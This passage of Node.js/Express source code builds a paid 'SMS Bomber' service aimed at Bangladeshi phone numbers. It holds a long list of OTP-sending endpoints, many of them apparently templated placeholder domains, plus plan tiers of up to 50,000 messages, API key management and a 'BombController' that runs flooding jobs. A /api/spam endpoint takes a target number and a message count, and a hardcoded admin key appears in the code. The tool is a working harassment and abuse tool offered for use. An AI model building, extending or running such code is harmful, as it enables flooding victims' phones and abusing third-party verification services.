  { id: 117, name: "BD API 117", method: "POST", url: "https://api.bangladesh117.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 118, name: "BD API 118", method: "GET", url: "https://api.bangladesh118.com/send-otp?phone={phone}" },
  { id: 119, name: "BD API 119", method: "POST", url: "https://api.bangladesh119.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 120, name: "BD API 120", method: "GET", url: "https://api.bangladesh120.com/send-otp?phone={phone}" },
  { id: 121, name: "BD API 121", method: "POST", url: "https://api.bangladesh121.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 122, name: "BD API 122", method: "GET", url: "https://api.bangladesh122.com/send-otp?phone={phone}" },
  { id: 123, name: "BD API 123", method: "POST", url: "https://api.bangladesh123.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 124, name: "BD API 124", method: "GET", url: "https://api.bangladesh124.com/send-otp?phone={phone}" },
  { id: 125, name: "BD API 125", method: "POST", url: "https://api.bangladesh125.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 126, name: "BD API 126", method: "GET", url: "https://api.bangladesh126.com/send-otp?phone={phone}" },
  { id: 127, name: "BD API 127", method: "POST", url: "https://api.bangladesh127.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 128, name: "BD API 128", method: "GET", url: "https://api.bangladesh128.com/send-otp?phone={phone}" },
  { id: 129, name: "BD API 129", method: "POST", url: "https://api.bangladesh129.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 130, name: "BD API 130", method: "GET", url: "https://api.bangladesh130.com/send-otp?phone={phone}" },
  { id: 131, name: "BD API 131", method: "POST", url: "https://api.bangladesh131.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 132, name: "BD API 132", method: "GET", url: "https://api.bangladesh132.com/send-otp?phone={phone}" },
  { id: 133, name: "BD API 133", method: "POST", url: "https://api.bangladesh133.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 134, name: "BD API 134", method: "GET", url: "https://api.bangladesh134.com/send-otp?phone={phone}" },
  { id: 135, name: "BD API 135", method: "POST", url: "https://api.bangladesh135.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 136, name: "BD API 136", method: "GET", url: "https://api.bangladesh136.com/send-otp?phone={phone}" },
  { id: 137, name: "BD API 137", method: "POST", url: "https://api.bangladesh137.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 138, name: "BD API 138", method: "GET", url: "https://api.bangladesh138.com/send-otp?phone={phone}" },
  { id: 139, name: "BD API 139", method: "POST", url: "https://api.bangladesh139.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 140, name: "BD API 140", method: "GET", url: "https://api.bangladesh140.com/send-otp?phone={phone}" },
  { id: 141, name: "BD API 141", method: "POST", url: "https://api.bangladesh141.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 142, name: "BD API 142", method: "GET", url: "https://api.bangladesh142.com/send-otp?phone={phone}" },
  { id: 143, name: "BD API 143", method: "POST", url: "https://api.bangladesh143.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 144, name: "BD API 144", method: "GET", url: "https://api.bangladesh144.com/send-otp?phone={phone}" },
  { id: 145, name: "BD API 145", method: "POST", url: "https://api.bangladesh145.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 146, name: "BD API 146", method: "GET", url: "https://api.bangladesh146.com/send-otp?phone={phone}" },
  { id: 147, name: "BD API 147", method: "POST", url: "https://api.bangladesh147.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
  { id: 148, name: "BD API 148", method: "GET", url: "https://api.bangladesh148.com/send-otp?phone={phone}" },
  { id: 149, name: "BD API 149", method: "POST", url: "https://api.bangladesh149.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
  { id: 150, name: "BD API 150", method: "GET", url: "https://api.bangladesh150.com/send-otp?phone={phone}" }
];

// ---------- MORE BANGLADESH APIS (IDs 201-300) ----------
const MORE_BANGLADESH_APIS = [];
for (let i = 1; i <= 100; i++) {
  MORE_BANGLADESH_APIS.push({
    id: 200 + i,
    name: `BD Service ${i}`,
    method: i % 2 === 0 ? 'GET' : 'POST',
    url: i % 2 === 0 
      ? `https://api.bdservice${i}.com/send-otp?phone={phone}`
      : `https://api.bdservice${i}.com/v1/auth/send-otp`,
    body: i % 2 !== 0 ? { "mobile": "{phone}" } : undefined
  });
}

// Combine all Bangladesh APIs
const ALL_BANGLADESH_APIS = [
  ...BANGLADESH_APIS,
  ...ADDITIONAL_BANGLADESH_APIS,
  ...MORE_BANGLADESH_APIS
];

console.log(`🇧🇩 Total Bangladesh APIs loaded: ${ALL_BANGLADESH_APIS.length}`);

// ============================================================
// PART 6: PLAN CONFIGURATION
// ============================================================

const PLAN_CONFIG = {
  free: {
    name: 'Free',
    maxCount: 50,
    requiresKey: false,
    rateLimit: 50,
    priority: 1,
    description: 'Free plan - 50 SMS/API, No key required',
    features: ['Basic SMS', 'Stop/Pause/Resume', 'Basic Analytics']
  },
  premium: {
    name: 'Premium',
    maxCount: 500,
    requiresKey: true,
    rateLimit: 1000,
    priority: 3,
    description: 'Premium plan - 500 SMS/API, Key required',
    features: ['Advanced SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue']
  },
  enterprise: {
    name: 'Enterprise',
    maxCount: 5000,
    requiresKey: true,
    rateLimit: 5000,
    priority: 5,
    description: 'Enterprise plan - 5,000 SMS/API, Key required',
    features: ['Enterprise SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue', 'Webhooks']
  },
  unlimited: {
    name: 'Unlimited',
    maxCount: 50000,
    requiresKey: true,
    rateLimit: 10000,
    priority: 10,
    description: 'Unlimited plan - 50,000 SMS/API, Key required',
    features: ['Unlimited SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue', 'Webhooks', 'Dedicated Support']
  }
};

// ============================================================
// PART 7: KEY MANAGEMENT WITH FIXED FILE STORAGE
// ============================================================

class KeyManager {
  constructor() {
    this.keysDir = path.join(__dirname, 'data');
    this.keysFile = path.join(this.keysDir, 'keys.json');
    this.backupFile = path.join(this.keysDir, 'keys_backup.json');
    
    // Ensure data directory exists
    Utility.ensureDirectoryExists(this.keysDir);
    
    this.validKeys = this.loadKeys();
    this.keyHistory = [];
    this.maxHistory = 1000;
    this.rateLimits = new Map();
    this.keyUsage = new Map();
    this.cleanupInterval = setInterval(() => this.cleanup(), 3600000);
    
    console.log(`📁 Key storage initialized: ${this.keysFile}`);
    console.log(`🔑 Total keys loaded: ${this.validKeys.size}`);
  }

  loadKeys() {
    try {
      if (fs.existsSync(this.keysFile)) {
        const data = fs.readFileSync(this.keysFile, 'utf8');
        if (!data || data.trim() === '') {
          console.log('⚠️ Empty keys file, initializing new key store');
          return new Map();
        }
        
        const parsed = JSON.parse(data);
        const keysMap = new Map();
        let validCount = 0;
        
        Object.entries(parsed).forEach(([key, value]) => {
          const keyData = {
            expiry: new Date(value.expiry),
            plan: value.plan || 'premium',
            created: new Date(value.created || Date.now()),
            lastUsed: value.lastUsed ? new Date(value.lastUsed) : null,
            usageCount: value.usageCount || 0,
            active: value.active !== false
          };
          
          // Check if key is still valid
          if (new Date() < keyData.expiry && keyData.active) {
            validCount++;
          }
          
          keysMap.set(key, keyData);
        });
        
        console.log(`📁 Loaded ${keysMap.size} keys (${validCount} valid, ${keysMap.size - validCount} expired/inactive)`);
        return keysMap;
      } else {
        console.log('⚠️ No keys file found, creating new key store');
        this.saveKeys(); // Create empty file
        return new Map();
      }
    } catch (error) {
      console.error('❌ Error loading keys:', error.message);
      
      // Try loading from backup
      if (fs.existsSync(this.backupFile)) {
        try {
          console.log('🔄 Attempting to load keys from backup...');
          const backupData = fs.readFileSync(this.backupFile, 'utf8');
          const parsed = JSON.parse(backupData);
          const keysMap = new Map();
          
          Object.entries(parsed).forEach(([key, value]) => {
            keysMap.set(key, {
              expiry: new Date(value.expiry),
              plan: value.plan || 'premium',
              created: new Date(value.created || Date.now()),
              lastUsed: value.lastUsed ? new Date(value.lastUsed) : null,
              usageCount: value.usageCount || 0,
              active: value.active !== false
            });
          });
          
          console.log(`✅ Recovered ${keysMap.size} keys from backup`);
          return keysMap;
        } catch (backupError) {
          console.error('❌ Failed to load backup keys:', backupError.message);
        }
      }
      
      return new Map();
    }
  }

  saveKeys() {
    try {
      const obj = {};
      for (const [key, value] of this.validKeys.entries()) {
        obj[key] = {
          expiry: value.expiry.toISOString(),
          plan: value.plan,
          created: value.created.toISOString(),
          lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
          usageCount: value.usageCount || 0,
          active: value.active !== false
        };
      }
      
      // Create backup of existing file
      if (fs.existsSync(this.keysFile)) {
        try {
          fs.copyFileSync(this.keysFile, this.backupFile);
        } catch (backupError) {
          console.warn('⚠️ Could not create backup:', backupError.message);
        }
      }
      
      // Write to temp file first
      const tempFile = this.keysFile + '.tmp';
      fs.writeFileSync(tempFile, JSON.stringify(obj, null, 2), 'utf8');
      
      // Verify temp file was written correctly
      if (fs.existsSync(tempFile) && fs.statSync(tempFile).size > 0) {
        // Rename temp to actual (atomic operation on most systems)
        fs.renameSync(tempFile, this.keysFile);
        console.log(`💾 Successfully saved ${Object.keys(obj).length} keys to file`);
        return true;
      } else {
        throw new Error('Temp file write failed');
      }
    } catch (error) {
      console.error('❌ Error saving keys:', error.message);
      
      // Try direct write as fallback
      try {
        const obj = {};
        for (const [key, value] of this.validKeys.entries()) {
          obj[key] = {
            expiry: value.expiry.toISOString(),
            plan: value.plan,
            created: value.created.toISOString(),
            lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
            usageCount: value.usageCount || 0,
            active: value.active !== false
          };
        }
        fs.writeFileSync(this.keysFile, JSON.stringify(obj, null, 2), 'utf8');
        console.log('💾 Fallback save successful');
        return true;
      } catch (fallbackError) {
        console.error('❌ Fallback save also failed:', fallbackError.message);
        return false;
      }
    }
  }

  generateKey(plan = 'premium', days = 30) {
    try {
      const apiKey = Utility.generateApiKey();
      const expiryDate = new Date();
      expiryDate.setDate(expiryDate.getDate() + days);
      
      const keyData = {
        expiry: expiryDate,
        plan: plan,
        created: new Date(),
        lastUsed: null,
        usageCount: 0,
        active: true
      };
      
      this.validKeys.set(apiKey, keyData);
      
      // Save to file immediately
      const saved = this.saveKeys();
      
      if (!saved) {
        // Remove from memory if save failed
        this.validKeys.delete(apiKey);
        throw new Error(ERROR_MESSAGES.KEY_SAVE_FAILED);
      }
      
      // Add to history
      this.keyHistory.push({
        key: apiKey,
        plan: plan,
        generated: Date.now(),
        expires: expiryDate.toISOString()
      });
      
      if (this.keyHistory.length > this.maxHistory) {
        this.keyHistory.shift();
      }
      
      console.log(`✅ New API Key Generated: ${apiKey.substring(0, 15)}... (${plan} plan, ${days} days)`);
      
      return { 
        apiKey, 
        expiryDate, 
        plan,
        saved: true
      };
    } catch (error) {
      console.error('❌ Key generation failed:', error.message);
      throw new Error(`${ERROR_MESSAGES.KEY_GENERATION_FAILED}: ${error.message}`);
    }
  }

  validateKey(key) {
    if (!this.validKeys.has(key)) return false;
    const keyData = this.validKeys.get(key);
    if (!keyData.active) return false;
    return new Date() < keyData.expiry;
  }

  getKeyInfo(key) {
    if (!this.validKeys.has(key)) return null;
    const keyData = this.validKeys.get(key);
    const now = new Date();
    return {
      key: key.substring(0, 10) + '...',
      fullKey: key,
      plan: keyData.plan,
      expires: keyData.expiry.toISOString(),
      valid: now < keyData.expiry && keyData.active,
      daysLeft: Math.max(0, Math.ceil((keyData.expiry - now) / (1000 * 60 * 60 * 24))),
      created: keyData.created.toISOString(),
      lastUsed: keyData.lastUsed ? keyData.lastUsed.toISOString() : null,
      usageCount: keyData.usageCount || 0,
      active: keyData.active
    };
  }

  useKey(key) {
    if (!this.validateKey(key)) return false;
    const keyData = this.validKeys.get(key);
    keyData.lastUsed = new Date();
    keyData.usageCount = (keyData.usageCount || 0) + 1;
    
    // Save periodically (every 10 uses)
    if (keyData.usageCount % 10 === 0) {
      this.saveKeys();
    }
    
    // Track usage for rate limiting
    if (!this.keyUsage.has(key)) {
      this.keyUsage.set(key, { count: 0, resetTime: Date.now() + 60000 });
    }
    const usage = this.keyUsage.get(key);
    if (Date.now() > usage.resetTime) {
      usage.count = 0;
      usage.resetTime = Date.now() + 60000;
    }
    usage.count++;
    this.keyUsage.set(key, usage);
    
    return true;
  }

  getKeyUsage(key) {
    if (!this.keyUsage.has(key)) return { count: 0, limit: this.getRateLimit(key) };
    const usage = this.keyUsage.get(key);
    return {
      count: usage.count,
      limit: this.getRateLimit(key),
      remaining: Math.max(0, this.getRateLimit(key) - usage.count)
    };
  }

  getRateLimit(key) {
    const keyData = this.validKeys.get(key);
    if (!keyData) return 0;
    const planLimits = {
      premium: 1000,
      enterprise: 5000,
      unlimited: 10000
    };
    return planLimits[keyData.plan] || 100;
  }

  revokeKey(key) {
    if (this.validKeys.has(key)) {
      const keyData = this.validKeys.get(key);
      keyData.active = false;
      this.saveKeys();
      return true;
    }
    return false;
  }

  getAllKeys() {
    const keys = [];
    for (const [key, value] of this.validKeys.entries()) {
      keys.push({
        key: key.substring(0, 10) + '...',
        fullKey: key,
        plan: value.plan,
        expires: value.expiry.toISOString(),
        valid: new Date() < value.expiry && value.active,
        daysLeft: Math.max(0, Math.ceil((value.expiry - new Date()) / (1000 * 60 * 60 * 24))),
        created: value.created.toISOString(),
        lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
        usageCount: value.usageCount || 0,
        active: value.active !== false
      });
    }
    return keys;
  }

  cleanup() {
    const now = new Date();
    let count = 0;
    for (const [key, value] of this.validKeys.entries()) {
      if (now > value.expiry || !value.active) {
        this.validKeys.delete(key);
        count++;
      }
    }
    if (count > 0) {
      this.saveKeys();
      console.log(`🧹 Cleaned up ${count} expired/inactive keys`);
    }
    return count;
  }

  getStorageInfo() {
    return {
      filePath: this.keysFile,
      fileExists: fs.existsSync(this.keysFile),
      fileSize: fs.existsSync(this.keysFile) ? Utility.formatBytes(fs.statSync(this.keysFile).size) : '0 Bytes',
      backupExists: fs.existsSync(this.backupFile),
      keysInMemory: this.validKeys.size,
      writePermission: Utility.testWritePermission(this.keysDir)
    };
  }

  destroy() {
    if (this.cleanupInterval) {
      clearInterval(this.cleanupInterval);
    }
    this.saveKeys(); // Final save before destroy
  }
}

// ============================================================
// PART 8: RATE LIMITER
// ============================================================

class RateLimiter {
  constructor() {
    this.requests = new Map();
    this.cleanupInterval = setInterval(() => this.cleanup(), 60000);
  }

  checkLimit(ip, key = null) {
    if (!CONFIG.security.rateLimit.enabled) return true;
    
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    const maxRequests = CONFIG.security.rateLimit.maxRequests;
    
    if (!this.requests.has(identifier)) {
      this.requests.set(identifier, []);
    }
    
    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
    timestamps.push(now);
    this.requests.set(identifier, timestamps);
    
    return timestamps.length <= maxRequests;
  }

  getRemaining(ip, key = null) {
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    const maxRequests = CONFIG.security.rateLimit.maxRequests;
    
    if (!this.requests.has(identifier)) return maxRequests;
    
    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
    return Math.max(0, maxRequests - timestamps.length);
  }

  getResetTime(ip, key = null) {
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    
    if (!this.requests.has(identifier)) return 0;
    
    const timestamps = this.requests.get(identifier);
    if (timestamps.length === 0) return 0;
    
    const oldest = timestamps[0];
    return Math.max(0, windowMs - (now - oldest));
  }

  cleanup() {
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    for (const [key, timestamps] of this.requests.entries()) {
      const filtered = timestamps.filter(t => now - t < windowMs);
      if (filtered.length === 0) {
        this.requests.delete(key);
      } else {
        this.requests.set(key, filtered);
      }
    }
  }

  destroy() {
    if (this.cleanupInterval) {
      clearInterval(this.cleanupInterval);
    }
  }
}

// ============================================================
// PART 9: BOMB CONTROLLER
// ============================================================

class BombController extends EventEmitter {
  constructor() {
    super();
    this.activeJobs = new Map();
    this.pausedJobs = new Map();
    this.completedJobs = new Map();
    this.jobCounter = 0;
    this.globalPause = false;
    this.globalStop = false;
    this.stats = {
      totalJobs: 0,
      totalSMS: 0,
      totalSuccess: 0,
      totalFailed: 0,
      startTime: Date.now(),
      peakActiveJobs: 0,
      totalErrors: 0,
      avgResponseTime: 0,
      responseTimeHistory: []
    };
    this.jobHistory = [];
    this.maxHistorySize = 10000;
    this.analyticsInterval = null;
    this.performanceMetrics = {
      requestsPerSecond: 0,
      successRate: 0,
      avgLatency: 0,
      errorRate: 0
    };
    this.requestCount = 0;
    this.lastRequestTime = Date.now();
    this._logs = [];
    
    if (CONFIG.analytics.enabled) {
      this.startAnalytics();
    }
  }

  registerJob(phone, totalCount, options = {}) {
    const jobId = Utility.generateJobId();
    const job = {
      id: jobId,
      phone: phone,
      maskedPhone: Utility.maskPhone(phone),
      totalCount: totalCount,
      sentCount: 0,
      successCount: 0,
      failCount: 0,
      startTime: Date.now(),
      status: 'active',
      options: options,
      progress: 0,
      errors: [],
      lastUpdate: Date.now(),
      stopped: false,
      paused: false,
      priority: options.priority || 1,
      retryCount: 0,
      maxRetries: options.maxRetries || 5,
      webhook: options.webhook || null,
      metadata: options.metadata || {}
    };
    
    this.activeJobs.set(jobId, job);
    this.jobCounter++;
    this.stats.totalJobs++;
    
    if (this.activeJobs.size > this.stats.peakActiveJobs) {
      this.stats.peakActiveJobs = this.activeJobs.size;
    }
    
    this.emit('jobRegistered', job);
    this.logEvent('job_registered', { jobId, phone: job.maskedPhone, totalCount });
    
    return jobId;
  }

  isJobActive(jobId) {
    if (this.globalStop) return false;
    if (this.globalPause) return false;
    const job = this.activeJobs.get(jobId);
    if (!job) return false;
    if (job.stopped) return false;
    if (job.paused) return false;
    return job.status === 'active';
  }

  stopJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job) {
      job.stopped = true;
      job.status = 'stopped';
      job.endTime = Date.now();
      this.activeJobs.delete(jobId);
      this.completedJobs.set(jobId, job);
      this.emit('jobStopped', job);
      this.logEvent('job_stopped', { jobId, phone: job.maskedPhone });
      return true;
    }
    
    const pausedJob = this.pausedJobs.get(jobId);
    if (pausedJob) {
      pausedJob.stopped = true;
      pausedJob.status = 'stopped';
      pausedJob.endTime = Date.now();
      this.pausedJobs.delete(jobId);
      this.completedJobs.set(jobId, pausedJob);
      this.emit('jobStopped', pausedJob);
      this.logEvent('job_stopped', { jobId, phone: pausedJob.maskedPhone });
      return true;
    }
    
    return false;
  }

  stopAllJobs() {
    this.globalStop = true;
    const jobs = Array.from(this.activeJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.stopJob(id)) count++;
    });
    
    const pausedJobs = Array.from(this.pausedJobs.keys());
    pausedJobs.forEach(id => {
      if (this.stopJob(id)) count++;
    });
    
    this.emit('allStopped', { count });
    this.logEvent('all_stopped', { count });
    return count;
  }

  pauseJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job && job.status === 'active' && !job.stopped) {
      job.paused = true;
      job.status = 'paused';
      this.activeJobs.delete(jobId);
      this.pausedJobs.set(jobId, job);
      this.emit('jobPaused', job);
      this.logEvent('job_paused', { jobId, phone: job.maskedPhone });
      return true;
    }
    return false;
  }

  pauseAllJobs() {
    this.globalPause = true;
    const jobs = Array.from(this.activeJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.pauseJob(id)) count++;
    });
    this.emit('allPaused', { count });
    this.logEvent('all_paused', { count });
    return count;
  }

  resumeJob(jobId) {
    const job = this.pausedJobs.get(jobId);
    if (job && !job.stopped) {
      job.paused = false;
      job.status = 'active';
      this.pausedJobs.delete(jobId);
      this.activeJobs.set(jobId, job);
      this.emit('jobResumed', job);
      this.logEvent('job_resumed', { jobId, phone: job.maskedPhone });
      return true;
    }
    return false;
  }

  resumeAllJobs() {
    this.globalPause = false;
    this.globalStop = false;
    const jobs = Array.from(this.pausedJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.resumeJob(id)) count++;
    });
    this.emit('allResumed', { count });
    this.logEvent('all_resumed', { count });
    return count;
  }

  updateJobStats(jobId, success, error = null, responseTime = 0) {
    const job = this.activeJobs.get(jobId);
    if (job && !job.stopped && !job.paused) {
      job.sentCount++;
      
      if (success) {
        job.successCount++;
        this.stats.totalSuccess++;
      } else {
        job.failCount++;
        this.stats.totalFailed++;
        if (error) {
          job.errors.push({
            timestamp: Date.now(),
            error: error
          });
        }
      }
      
      job.progress = ((job.sentCount / job.totalCount) * 100).toFixed(2);
      job.lastUpdate = Date.now();
      this.stats.totalSMS++;
      
      this.updatePerformanceMetrics(success, responseTime);
      
      if (job.sentCount >= job.totalCount) {
        job.status = 'completed';
        job.endTime = Date.now();
        this.activeJobs.delete(jobId);
        this.completedJobs.set(jobId, job);
        this.emit('jobCompleted', job);
        this.logEvent('job_completed', { 
          jobId, 
          phone: job.maskedPhone,
          success: job.successCount,
          failed: job.failCount,
          duration: (job.endTime - job.startTime) / 1000
        });
      }
    }
  }

  updatePerformanceMetrics(success, responseTime) {
    this.requestCount++;
    const now = Date.now();
    const timeDiff = (now - this.lastRequestTime) / 1000;
    
    if (timeDiff >= 1) {
      this.performanceMetrics.requestsPerSecond = this.requestCount / timeDiff;
      this.requestCount = 0;
      this.lastRequestTime = now;
    }
    
    const totalAttempts = this.stats.totalSuccess + this.stats.totalFailed;
    this.performanceMetrics.successRate = totalAttempts > 0 
      ? (this.stats.totalSuccess / totalAttempts) * 100 
      : 0;
    
    this.performanceMetrics.errorRate = totalAttempts > 0 
      ? (this.stats.totalFailed / totalAttempts) * 100 
      : 0;
    
    this.stats.responseTimeHistory.push(responseTime);
    if (this.stats.responseTimeHistory.length > 1000) {
      this.stats.responseTimeHistory.shift();
    }
    const sum = this.stats.responseTimeHistory.reduce((a, b) => a + b, 0);
    this.stats.avgResponseTime = this.stats.responseTimeHistory.length > 0 
      ? sum / this.stats.responseTimeHistory.length 
      : 0;
    
    this.performanceMetrics.avgLatency = this.stats.avgResponseTime;
  }

  startAnalytics() {
    this.analyticsInterval = setInterval(() => {
      this.generateAnalytics();
    }, CONFIG.analytics.interval);
  }

  generateAnalytics() {
    const stats = this.getStats();
    const analytics = {
      timestamp: Date.now(),
      totalJobs: stats.totalJobs,
      totalSMS: stats.totalSMS,
      totalSuccess: stats.totalSuccess,
      totalFailed: stats.totalFailed,
      successRate: stats.successRate,
      activeJobs: stats.activeJobs,
      pausedJobs: stats.pausedJobs,
      completedJobs: stats.completedJobs,
      uptime: stats.uptime,
      requestsPerSecond: this.performanceMetrics.requestsPerSecond,
      avgLatency: this.performanceMetrics.avgLatency,
      memoryUsage: Utility.getMemoryUsage(),
      cpuUsage: Utility.getCPUUsage()
    };
    
    this.emit('analytics', analytics);
    this.logEvent('analytics', analytics);
    
    this.jobHistory.push(analytics);
    if (this.jobHistory.length > this.maxHistorySize) {
      this.jobHistory.shift();
    }
    
    return analytics;
  }

  getJobStatus(jobId) {
    const job = this.activeJobs.get(jobId) || 
                this.pausedJobs.get(jobId) || 
                this.completedJobs.get(jobId);
    if (!job) return null;
    
    return {
      id: job.id,
      phone: job.maskedPhone,
      total: job.totalCount,
      sent: job.sentCount,
      success: job.successCount,
      fail: job.failCount,
      progress: job.progress + '%',
      status: job.status,
      startTime: job.startTime,
      endTime: job.endTime || null,
      duration: job.endTime ? ((job.endTime - job.startTime) / 1000).toFixed(2) + 's' : null,
      stopped: job.stopped || false,
      paused: job.paused || false,
      priority: job.priority || 1,
      errors: job.errors ? job.errors.slice(-10) : [],
      metadata: job.metadata || {}
    };
  }

  getAllJobs() {
    const jobs = [];
    
    this.activeJobs.forEach(job => {
      jobs.push({ ...this.getJobStatus(job.id), status: 'active' });
    });
    
    this.pausedJobs.forEach(job => {
      jobs.push({ ...this.getJobStatus(job.id), status: 'paused' });
    });
    
    this.completedJobs.forEach(job => {
      jobs.push({ ...this.getJobStatus(job.id), status: job.status });
    });
    
    return jobs;
  }

  getStats() {
    const totalAttempts = this.stats.totalSuccess + this.stats.totalFailed;
    return {
      totalJobs: this.stats.totalJobs,
      totalSMS: this.stats.totalSMS,
      totalSuccess: this.stats.totalSuccess,
      totalFailed: this.stats.totalFailed,
      successRate: totalAttempts > 0 
        ? ((this.stats.totalSuccess / totalAttempts) * 100).toFixed(2) + '%'
        : '0%',
      activeJobs: this.activeJobs.size,
      pausedJobs: this.pausedJobs.size,
      completedJobs: this.completedJobs.size,
      globalPause: this.globalPause,
      globalStop: this.globalStop,
      peakActiveJobs: this.stats.peakActiveJobs,
      uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's',
      memoryUsage: Utility.getMemoryUsage(),
      performance: this.performanceMetrics,
      avgResponseTime: this.stats.avgResponseTime.toFixed(2) + 'ms',
      totalErrors: this.stats.totalErrors
    };
  }

  logEvent(event, data) {
    const logEntry = {
      timestamp: Date.now(),
      event: event,
      data: data
    };
    
    if (CONFIG.logging.enabled && CONFIG.logging.console) {
      console.log(`📝 [${Utility.getCurrentTime()}] ${event}:`, JSON.stringify(data).substring(0, 200));
    }
    
    this._logs.push(logEntry);
    if (this._logs.length > 10000) {
      this._logs.shift();
    }
  }

  getLogs(limit = 100, eventType = null) {
    let logs = this._logs || [];
    if (eventType) {
      logs = logs.filter(log => log.event === eventType);
    }
    return logs.slice(-limit);
  }

  clearCompleted() {
    const count = this.completedJobs.size;
    this.completedJobs.clear();
    this.logEvent('cleanup', { cleared: count });
    return count;
  }

  clearLogs() {
    this._logs = [];
    this.logEvent('logs_cleared', {});
  }

  shutdown() {
    if (this.analyticsInterval) {
      clearInterval(this.analyticsInterval);
    }
    this.stopAllJobs();
    this.emit('shutdown', { stats: this.getStats() });
  }
}

// ============================================================
// PART 10: EXPRESS APP SETUP
// ============================================================

const app = express();
const bombController = new BombController();
const keyManager = new KeyManager();
const rateLimiter = new RateLimiter();

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key', 'X-Request-ID'],
  exposedHeaders: ['X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-RateLimit-Reset']
}));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../public')));

// Request ID middleware
app.use((req, res, next) => {
  req.requestId = Utility.generateId();
  res.setHeader('X-Request-ID', req.requestId);
  next();
});

// Logging middleware
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`📝 [${Utility.getCurrentTime()}] ${req.method} ${req.url} - ${res.statusCode} - ${duration}ms`);
  });
  next();
});

// Rate limiting middleware
app.use((req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const apiKey = req.query.key || req.headers['x-api-key'];
  
  const identifier = apiKey || ip;
  if (!rateLimiter.checkLimit(ip, apiKey)) {
    const resetTime = rateLimiter.getResetTime(ip, apiKey);
    const remaining = rateLimiter.getRemaining(ip, apiKey);
    res.setHeader('X-RateLimit-Limit', CONFIG.security.rateLimit.maxRequests);
    res.setHeader('X-RateLimit-Remaining', remaining);
    res.setHeader('X-RateLimit-Reset', Math.ceil(resetTime / 1000));
    
    return res.status(429).json({
      success: false,
      error: ERROR_MESSAGES.RATE_LIMIT,
      developer: DEVELOPER_INFO,
      retryAfter: Math.ceil(resetTime / 1000),
      requestId: req.requestId
    });
  }
  
  const remaining = rateLimiter.getRemaining(ip, apiKey);
  res.setHeader('X-RateLimit-Limit', CONFIG.security.rateLimit.maxRequests);
  res.setHeader('X-RateLimit-Remaining', remaining);
  next();
});

// ============================================================
// PART 11: API ENDPOINTS
// ============================================================

// Root
app.get('/', (req, res) => {
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    version: "7.0.0-ULTIMATE-BD",
    country: "Bangladesh Only",
    total_apis: ALL_BANGLADESH_APIS.length,
    message: "Ultimate SMS Bomber - Bangladesh Only Version",
    endpoints: {
      api_info: "/api",
      generate_key: "/api/create-key?plan=premium&days=30&admin_key=TNEH_ADMIN_2024",
      check_key: "/api/check-key?key=YOUR_KEY",
      spam: "/api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=100",
      stop: "/api/stop?key=YOUR_KEY&all=true",
      pause: "/api/pause?key=YOUR_KEY&all=true",
      resume: "/api/resume?key=YOUR_KEY&all=true",
      status: "/api/status?key=YOUR_KEY",
      stats: "/api/stats",
      health: "/api/health",
      debug_keys: "/api/debug/keys?admin_key=TNEH_ADMIN_2024"
    },
    requestId: req.requestId
  });
});

// API Info
app.get('/api', (req, res) => {
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    version: "7.0.0-ULTIMATE-BD",
    country: "Bangladesh Only",
    total_bangladesh_apis: ALL_BANGLADESH_APIS.length,
    plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
      acc[key] = {
        max_count: PLAN_CONFIG[key].maxCount,
        requires_key: PLAN_CONFIG[key].requiresKey,
        description: PLAN_CONFIG[key].description,
        features: PLAN_CONFIG[key].features
      };
      return acc;
    }, {}),
    key_storage: keyManager.getStorageInfo(),
    requestId: req.requestId
  });
});

// Generate API Key (FIXED - Now properly saves)
app.get('/api/create-key', (req, res) => {
